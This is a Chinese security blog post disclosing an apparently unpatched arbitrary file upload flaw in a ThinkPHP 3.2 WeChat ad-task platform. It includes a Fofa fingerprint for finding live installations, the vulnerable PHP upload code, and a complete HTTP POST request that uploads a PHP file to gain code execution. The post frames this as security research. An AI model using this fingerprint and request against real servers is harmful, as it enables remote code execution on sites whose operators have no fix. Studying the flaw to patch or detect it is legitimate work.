#  某最新微信广告任务平台存在任意文件上传漏洞(RCE)   
原创 Mstir  星悦安全   2024-09-21 12:29  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**源码简介:****本平台基于 Thinkphp3.2 框架精心打造，确保系统稳定、安全、高效运行。****核心功能：****第三方个人免签支付：无缝对接支付接口，支持微信、支付宝等多种支付方式，让交易更便捷。VIP 等级充值：提供不同等级的 VIP 会员服务，如钻石会员，享受更多特权和更高收益。******  
  
**Fofa指纹:"/tpl/Public/js/func.js"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cKdT0gp62ibrjvHgGCY10UzosbvgGcFODM0iclcxgGJlELxKqib8mxX9fCW9O9Zzpb5WwgiaXNYCufmA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cKdT0gp62ibrjvHgGCY10UzMUobfnbkSibCQdD84V4ztm0j7fG1sMoe9CvIicTFNSIp1eicqRNvOKyEQ/640?wx_fmt=png&from=appmsg "")  
  
**框架:ThinkPHP 3.2.3 Debug:True**  
## 0x01 漏洞分析  
  
**位于 /Home/Controller/IndexController.class.php 控制器的 ajax_upload 方法存在上传文件的操作，我们追踪一下.**  
```
/**
* webuploader 上传文件
*/
public function ajax_upload(){
  // 根据自己的业务调整上传路径、允许的格式、文件大小
  ajax_upload('/Uploads/images/');
}
```  
  
**实际继承自 /Common/Common/function.php 的 Ajax_upload 方法.**  
```
/**
 * 上传文件类型控制 此方法仅限ajax上传使用
 * @param  string   $path    字符串 保存文件路径示例：/Upload/image/
 * @param  string   $format  文件格式限制
 * @param  integer  $maxSize 允许的上传文件最大值 52428800
 * @return booler   返回ajax的json格式数据
 */
function ajax_upload($path='file',$output_type=0,$subName='date',$format='empty',$maxSize='52428800'){
    ini_set('max_execution_time', '0');
    // 去除两边的/
    $path=trim($path,'/');
    // 添加Upload根目录
    $path=strtolower(substr($path, 0,6))==='upload' ? ucfirst($path) : 'Upload/'.$path;
    // 上传文件类型控制
    $ext_arr= array(
        'image' => array('gif', 'jpg', 'jpeg', 'png', 'bmp'),
        'photo' => array('jpg', 'jpeg', 'png'),
        'flash' => array('swf', 'flv'),
        'media' => array('swf', 'flv', 'mp3', 'wav', 'wma', 'wmv', 'mid', 'avi', 'mpg', 'asf', 'rm', 'rmvb'),
        'file' => array('doc', 'docx', 'xls', 'xlsx', 'ppt', 'htm', 'html', 'txt', 'zip', 'rar', 'gz', 'bz2','pdf')
    );
    if( $subName == 'date' ) {
        $subName = array('date', 'Y-m-d'); //子目录创建方式，[0]-函数名，[1]-参数，多个参数使用数组
    }
    if(!empty($_FILES)){
        // 上传文件配置
        $config=array(
            'maxSize'   =>  $maxSize,               // 上传文件最大为50M
            'rootPath'  =>  './',                   // 文件上传保存的根路径
            'savePath'  =>  './'.$path.'/',         // 文件上传的保存路径（相对于根路径）
            'saveName'  =>  array('uniqid',''),     // 上传文件的保存规则，支持数组和字符串方式定义
            'autoSub'   =>  true,                   // 自动使用子目录保存上传文件 默认为true
            'exts'      =>    isset($ext_arr[$format])?$ext_arr[$format]:'',
            'subName'      => $subName, //子目录创建方式，[0]-函数名，[1]-参数，多个参数使用数组
        );
        // p($_FILES);
        // 实例化上传
        $upload=new \Think\Upload($config);
        // 调用上传方法
        $info=$upload->upload();
        // p($info);
        $data=array();
        if(!$info){
            // 返回错误信息
            $error=$upload->getError();
            $data['error_info']=$error;
            if( $output_type == 1 ) {
                return json_encode($data);
            } else {
                echo json_encode($data);
            }
        }else{

            // 返回成功信息
            foreach($info as $file){
                $data['name']=trim($file['savepath'].$file['savename'],'.');
                $data['oldname']=$file['name'];
                // p($data);
                if( $output_type == 1 ) {
                    return $data['name'];
                } else {
                    echo json_encode($data);
                }
            }
        }
    }
}
```  
  
**这里看起来限制了上传文件的后缀，实际去测根本没有任何限制.....**  
## 0x02 漏洞复现  
  
注意 这里需要普通用户登录之后操作.Payload:  
```
POST /index.php/Home/index/ajax_upload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCc7iBZFp1mvojsxn
Cookie: think_language=zh-CN; BJYADMIN=2150gjbkj92r835kg2dn9u9i75
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/index.php/Home/Index/index.html
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```  
  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转，RCE******  
  
**广告任务系统 源码关注公众号，发送 240921 获取.**  
  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
